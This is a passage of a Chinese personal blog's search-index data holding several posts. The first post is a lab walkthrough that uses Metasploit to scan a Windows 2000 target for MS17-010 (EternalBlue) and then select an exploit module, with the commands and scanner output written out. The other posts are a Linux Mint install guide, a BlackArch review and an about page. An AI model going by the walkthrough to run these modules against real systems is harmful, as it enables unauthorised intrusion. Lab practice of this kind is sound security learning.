","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/:3:0","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["渗透测试"],"content":"复现过程 重要的事情说三遍： 接下来就是最重要的一部分，你一定要认真看！认真看！认真看！ ","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/:4:0","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["渗透测试"],"content":"攻击环境 攻击机 靶机 操作系统 Arch Linux Windows2K IP地址 192.168.42.141 192.168.42.252 靶机截图: ","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/:4:1","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["渗透测试"],"content":"攻击过程 首先，攻击机打开终端，输入 msfconsole ，并按回车等待。 $ sudo msfconsole 建议加上sudo，以免出现未知错误。 稍等片刻，metasploit就打开了。如图 接下来，通过 search 命令本次要利用到的MS17_010模块 msf5 \u003e search ms17_010 然后就跳出一大堆 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal Yes MS17-010 SMB RCE Detection 2 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 3 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 4 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。 msf5 \u003e use auxiliary/scanner/smb/smb_ms17_010 顺便一提，metasploit是一款渗透测试工具，如果你想了解这些模块是怎么运作的，那么你要掌握这几条命令： search 用于搜素模块，然后列出这个模块使用方式，如上面演示的一样。 info 显示该模块的详细信息。 show + [option] 显示该模块的部分信息。 show options 显示该模块需要设置的项目 show payloads 显示该模块可使用的攻击载荷 注意，第三条和第四条不要搞混了，第二条那个[option]是指代。 回归正题，我们先看看这个模块的信息。 msf5 auxiliary(scanner/smb/smb_ms17_010) \u003e info 然后又出了一大堆qwq… Name: MS17-010 SMB RCE Detection Module: auxiliary/scanner/smb/smb_ms17_010 License: Metasploit Framework License (BSD) Rank: Normal Provided by: Sean Dillon \u003csean.dillon@risksense.com\u003e Luke Jennings Check supported: Yes Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /opt/metasploit/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads Description: Uses information disclosure to determine if MS17-010 has been patched or not. Specifically, it connects to the IPC$ tree and attempts a transaction on FID 0. If the status returned is \"STATUS_INSUFF_SERVER_RESOURCES\", the machine does not have the MS17-010 patch. If the machine is missing the MS17-010 patch, the module will check for an existing DoublePulsar (ring 0 shellcode/malware) infection. This module does not require valid SMB credentials in default server configurations. It can log on as the user \"\\\" and connect to IPC$. References: https://cvedetails.com/cve/CVE-2017-0143/ https://cvedetails.com/cve/CVE-2017-0144/ https://cvedetails.com/cve/CVE-2017-0145/ https://cvedetails.com/cve/CVE-2017-0146/ https://cvedetails.com/cve/CVE-2017-0147/ https://cvedetails.com/cve/CVE-2017-0148/ https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010 https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html https://github.com/countercept/doublepulsar-detection-script https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Also known as: DOUBLEPULSAR ETERNALBLUE 然而这里我们只需要看那个Basic options部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个目标IP(RHOST)，而那个 RPORT(目标端口) 已经被指定为445了。 接下来执行… msf5 auxiliary(scanner/smb/smb_ms17_010) \u003e set rhost 192.168.42.252 msf5 auxiliary(scanner/smb/smb_ms17_010) \u003e run 返回后我们得到了这些 [+] 192.168.42.252:445 - Host is likely VULNERABLE to MS17-010! - Windows 5.0 x86 (32-bit) [*] 192.168.42.252:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 说明目标是存在MS17_010漏洞的，那么我们接下来将要使用的是攻击模块，也就是上面搜索到的最后一个。 exploit/windows/smb/ms17_010_psexec 那么，执行 msf5 auxiliary(scanner/smb/smb_ms17_010) \u003e use exploit/windows/smb/ms17_010_psexec 接下来msf5后面的模块就变成了攻击模块了。 然后继续执行info，没错，","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/:4:2","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["渗透测试"],"content":"小结 首先本篇博客仅作为测试用途，请勿将其用于违法用途。 其次，ms17-010这类的漏洞都是十分危险的，Windows用户一定要注意及时更新，打好补丁，不要给坏人可乘之机，最好是干脆直接日用Linux，windows仅用于娱乐即可。 然后这篇博客也带有很多水的成分，谢谢浏览。 ","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/:5:0","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["Linux"],"content":"非常适合萌新的一个发行版。","date":"2019-06-23","objectID":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/","tags":["教程","Linux Mint","系统安装","Linux 入门","新手"],"title":"Linux Mint 安装教程","uri":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"categories":["Linux"],"content":"简介 Linux Mint是一款由Linux Mint Team团队从2006年开始发行，是基于Debian和Ubuntu的发行版。 其目的是提供一种更加完整的即刻可用体验，它诞生的目的是为家庭用户和企业提供一个免费的，易用的，舒适而优雅的桌面操作系统。 包括了浏览器 多媒体播放器 DVD播放支持 Java和其他组件，它有三个桌面环境版本，分别是Cinnamon，MATE，xfce。 ","date":"2019-06-23","objectID":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/:1:0","tags":["教程","Linux Mint","系统安装","Linux 入门","新手"],"title":"Linux Mint 安装教程","uri":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"categories":["Linux"],"content":"下载 Linux Mint可以去官网下载，官网有两种下载方式，一种是通过所在国家对应的镜像站进行HTTP下载，还有一种就是通过种子下载的。 由于官网上的上海大学开源镜像站进不去所以我只好选择了种子下载，但是本篇博客将会提供xfce版本的下载地址。 Linux Mint官网：https://www.linuxmint.com/ 墙内用户可以从以下两个镜像源快速下载Linux Mint: 清华开源镜像站 中科大开源镜像站 ","date":"2019-06-23","objectID":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/:2:0","tags":["教程","Linux Mint","系统安装","Linux 入门","新手"],"title":"Linux Mint 安装教程","uri":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"categories":["Linux"],"content":"安装 xfce版本安装条件：至少512MB或以上的内存，15GB或以上的磁盘空间 你可以选择安装在物理机上，也可以安装在虚拟机上。 如果你需要安装在物理机则需要使用refus等类似的U盘启动制作工具制作启动盘。 本篇博客将使用虚拟机作为演示。 ","date":"2019-06-23","objectID":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/:3:0","tags":["教程","Linux Mint","系统安装","Linux 入门","新手"],"title":"Linux Mint 安装教程","uri":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"categories":["Linux"],"content":"安装过程 挂载安装介质 首先将下载好的镜像文件加入虚拟机的启动，如果是物理机则插入你制作好的启动盘。 选择好之后，点击确定 然后启动虚拟机即可。而物理机则需要重启然后按相应的键，ESC F12 F11之类的，这些百度上都有，搜索“你电脑的品牌或者主板的品牌+U盘启动”就可以查到 然后虚拟机将会自动切换到虚拟CD进行启动，等待即可。 接下来就会出现这个画面，等待10秒后进入了CD Live即可。 10秒后，将会进入开机动画，不用多解释（还挺好看的哈） 再过了一会儿，就进入这个界面了，这就是我上文说的CD Live。 哈哈哈哈吐嘈一下这个时间显示，为什么是8点呢，而我发布这篇博客的时间是下午两点啊，其实是因为这个CD Live的默认时区不一样，不用理会他，我们继续操作即可。 选择语言，习惯和安装需要 那么接下来点击这个 “Install Linux Mint” ，然后就会弹出这个安装界面了，第一页这里是选择语言，我们选择简体中文（当然你看得懂什么语言就选什么语言）。 然后就是选择键盘布局了，这里默认就好，或者选择美式，但都差不多是一样的。 分区 然后就是一个重头戏了,你一定要认真看！认真看！认真看！ （重要的事情说三遍） 这里会给你两个选项来进行分区，其中第一个单选框的意思是把你的整个硬盘全部格式化然后再安装Linux Mint，如果你是虚拟机的话选这个无所谓，但是如果你是物理机的话就要慎重了,无论安装成功或失败你的原有数据都会丢失。 下面两个勾不用理会，因为大部分人都不会选择第一个单选框，所以这两个勾毫无意义了。本篇博客也将选择 “其他选项” 。 那么我们选择下面那个 “其他选项” 。 选择其他选项后，就会进入这个页面，这里就是建立分区表的地方（废话，下面都写着呢，还用你说）了。 那么，因为教程演示是虚拟机，所以点击新建分区表，如果是物理机则不需要了。 这时候会弹出一个提示，这个也不必理会它，直接点继续即可。 接下来一个空的分区表就建立好了。 那么，要怎样分区呢？ 我们知道Linux必须分的区有根(/)分区、/boot分区和swap分区，那么该分多少呢? 从/boot说起，这个分区是存放系统启动引导文件的，只需要500MB左右，但别小看了这个小分区，如果没有这个，根分区一旦被写满，系统将无法启动。 SWAP分区：用于给内存交换空间，当内存要爆了的时候系统会把一部分进程转移到SWAP里面，它所需的大小可以是内存大小的一半，也可以与内存大小相等，也可以是内存的两倍，但是太大也不好，如果内存够用的话，swap分太大会浪费不少的硬盘存储空间。 最后是根分区了，这个好理解，就是系统分区，应该将剩下的全都分给它。 那么具体怎么分呢，参考我操作咯 点击那个+,将会弹出一个创建分区的窗口 先创建一个/boot分区，大小500MB，文件系统为EXT4文件系统，挂载点为/boot。 然后发现左下角的+，变成了灰色？不用怕，继续选择空闲空间它就会变成可选择的了。 那么同上操作，我们分SWAP，但是注意了：SWAP不是挂载点，应该在文件系统里选择 “交换空间” 类型为主分区，大小1024MB，文件系统为交换空间，挂载点不用选择 那么同上操作，我们来分根分区，类型主分区，文件系统EXT4，挂载点/，大小将剩下的容量全部给它。 之后分区基本上就完成了 开始全自动安装 现在我们可以安装了，点击 “现在安装” 即可，接下来会弹出一个提示，内容如图，点击 “继续” 即可。 接下来就会要你选择地区了，这个决定了系统的时区，一定要根据实际情况选择，我们选择上海。然后点击 “继续” 然后设置什么姓名啊计算机名啊用户名啊密码啊什么的，这些可以随便写，但是你一定要记住你写的用户名和密码是什么。 下面有一个加密主目录，可选可不选，意思是把你的用户目录进行加密，我就不选了，没必要。 写好选好以后，点击继续即可。 接下来就会开始安装了，全自动哦～去喝杯奶茶慢慢等吧。 一直等就好。 直到出现了这个窗口 那么恭喜你，你安装成功了！点击现在重启。 如果你出现了这个，虚拟机把虚拟光驱卸掉按回车即可，物理机则拔掉U盘按回车即可。 （物理机一般不会出现这个） 接下来如果没出问题的话，就进入系统了。 登录你刚刚设置的用户和密码，好好享受吧。 ","date":"2019-06-23","objectID":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/:3:1","tags":["教程","Linux Mint","系统安装","Linux 入门","新手"],"title":"Linux Mint 安装教程","uri":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"categories":["Linux"],"content":"总结 稍微总结一下，Linux Mint是对新手比较友好的一份Linux发行版，它的安装过程也是非常简单的，基本上都是图形操作点点点。所以非常推荐新手学习使用 另外，本博客仅供参考和学习，如果出现其他问题请自行百度。 如需转载，请注明出处。 ","date":"2019-06-23","objectID":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/:4:0","tags":["教程","Linux Mint","系统安装","Linux 入门","新手"],"title":"Linux Mint 安装教程","uri":"/zh-cn/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"categories":["Linux"],"content":"一篇狗屁不通的用后感...","date":"2019-06-16","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/","tags":["Linux","Arch Linux","渗透测试","黑客"],"title":"关于BlackArch的体验报告","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":" 今天我尝试装了一下black Arch，花了很长时间，之后发现这个系统并不是很完美。 ","date":"2019-06-16","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:0:0","tags":["Linux","Arch Linux","渗透测试","黑客"],"title":"关于BlackArch的体验报告","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"优点 首先说说它的优点: 这玩意集成了几千个软件包，并且都是一些很厉害的工具 其次这玩意很酷，特别是壁纸，配色什么的，我都觉得特别炫酷 以及它安装的便捷性，我一开始以为它比Arch难安装，其实用完才知道这个安装简直比Arch简单十倍，只不过我习惯了Arch那种手动式，这种半自动化却不习惯了 ","date":"2019-06-16","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:1:0","tags":["Linux","Arch Linux","渗透测试","黑客"],"title":"关于BlackArch的体验报告","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"缺点 现在来说说缺点: 首先ISO实在是太大了，Black Arch官方的live ISO达到了12GB，我idm都下载了很久，而网络安装包和Arch的大小一样，不过我没试过 更可怕的是 blackarch官方镜像的安装最低硬盘需求达到了40GB以上，这使得大部分人缺乏这个安装条件 其次就是它的桌面环境实在太简陋了，而且性能上也特别不好，特别是i3和spectrwm这两个，根本无法操作，fluxbox最炫酷但是习惯太不适合大部分人了，openbox啥都没有，更不好操作，而且不支持中文，弄得我很蛋疼；还有就是依赖太乱了，换别的桌面环境很麻烦，比如我想卸载掉其他的换xfce，结果pacman -Rs卸载不了，得用Rsc才能卸载，结果把lxdm给卸掉了，进不去图形了，后来装上lxdm出现了很大的颜色bug。。。 ","date":"2019-06-16","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:2:0","tags":["Linux","Arch Linux","渗透测试","黑客"],"title":"关于BlackArch的体验报告","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"总结 首先不能否认BlackArch是装逼的好东西，但是我不推荐使用官方的镜像（无论是在线镜像还是离线live）去安装，否则就会有我的下场了，其次就是用户必须有Arch系基础，否则就是个坑。建议先安装Arch，然后导入BlackArch的软件库安装全套工具即可。最后请不要那blackarch与kali、parrot对比，这没有对比性的，工具都差不多的。 ","date":"2019-06-16","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:3:0","tags":["Linux","Arch Linux","渗透测试","黑客"],"title":"关于BlackArch的体验报告","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":"about","content":"Once lost thing will never be able to come back.","date":"0001-01-01","objectID":"/zh-cn/about/","tags":["about"],"title":"关于我","uri":"/zh-cn/about/"},{"categories":"about","content":" 简介 是一只大专笨狗 Arch User Python 初学者 Telegram 频道 @WeepingDogel ","date":"0001-01-01","objectID":"/zh-cn/about/:0:0","tags":["about"],"title":"关于我","uri":"/zh-cn/about/"},{"categories":"about","content":"技能 ","date":"0001-01-01","objectID":"/zh-cn/about/:1:0","tags":["about"],"title":"关于我","uri":"/zh-cn/about/"},{"categories":"about","content":"学习中 ","date":"0001-01-01","objectID":"/zh-cn/about/:2:0","tags":["about"],"title":"关于我","uri":"/zh-cn/about/"},{"categories":"about","content":"操作系统 ","date":"0001-01-01","objectID":"/zh-cn/about/:3:0","tags":["about"],"title":"关于我","uri":"/zh-cn/about/"},{"categories":"about","content":"编辑器 ","date":"0001-01-01","objectID":"/zh-cn/about/:4:0","tags":["about"],"title":"关于我","uri":"/zh-cn/about/"},{"categories":"about","content":"浏览器 ","date":"0001-01-01","objectID":"/zh-cn/about/:5:0","tags":["about"],"title":"关于我","uri":"/zh-cn/about/"},{"categories":"about","content":"联系我 版权声明 除特别注明外，本站所有文章皆为原创。 本站遵循 CC-BY-NC 4.0 协议 转载请注明链接 部分文章以截图作为封面，多数文章封面图均来自 wallhaven.cc。 友链 依云’s Blog 李皓奇 | liolok.com crzy233.github.io mushin2k的博客 Piggy’s Blog 欠陥電気の摸鱼小池 111的 Blog 首页-zhyjc6’s Blog Home | website_project ⑨BIE Garden in the Wonderland 欧式的Blog Dec KiraPGR’s Blog Lynnrin’s Blog poly000客栈 rcd的博客 PangLAN ’s Blog Toka’s Blog Mare_Infinitus - 无限深海 Episode 33’s Blog ","date":"0001-01-01","objectID":"/zh-cn/about/:6:0","tags":["about"],"title":"关于我","uri":"/zh-cn/about/"}]